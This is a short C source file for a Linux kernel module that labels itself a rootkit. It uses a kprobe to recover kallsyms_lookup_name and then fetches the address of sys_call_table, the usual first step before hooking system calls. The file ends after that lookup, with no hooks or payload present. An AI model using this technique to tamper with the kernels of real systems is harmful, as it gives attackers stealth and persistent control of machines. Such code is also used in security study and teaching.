#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/version.h>
#include <linux/kallsyms.h>
#include <linux/kprobes.h>


typedef unsigned long (* kallsyms_lookup_name_t)(const char* name);
unsigned long sys_call_table_addr;


static struct kprobe kp = {
        .symbol_name = "kallsyms_lookup_name"
};


static int __init mod_init(void)
{
    printk(KERN_INFO "rootkit: start\n");

    int ret = register_kprobe(&kp);
    if (ret < 0) {
        pr_err("[monitor] register_kprobe failed, returned %d\n", ret);
        return ret;
    }

    pr_info("[monitor] kprobe registered. kallsyms_lookup_name found at 0x%px\n",
            kp.addr);

    kallsyms_lookup_name_t kallsyms_lookup_name = (kallsyms_lookup_name_t) kp.addr;

    unregister_kprobe(&kp);
    pr_info("[monitor] kprobe unregistered. now to the meat and potatoes...\n");

    sys_call_table_addr = kallsyms_lookup_name("sys_call_table");

    return 0;
}


static void __exit mod_exit(void)
{
    printk(KERN_INFO "rootkit: exit\n");
}


MODULE_LICENSE("GPL");
module_init(mod_init);
module_exit(mod_exit);
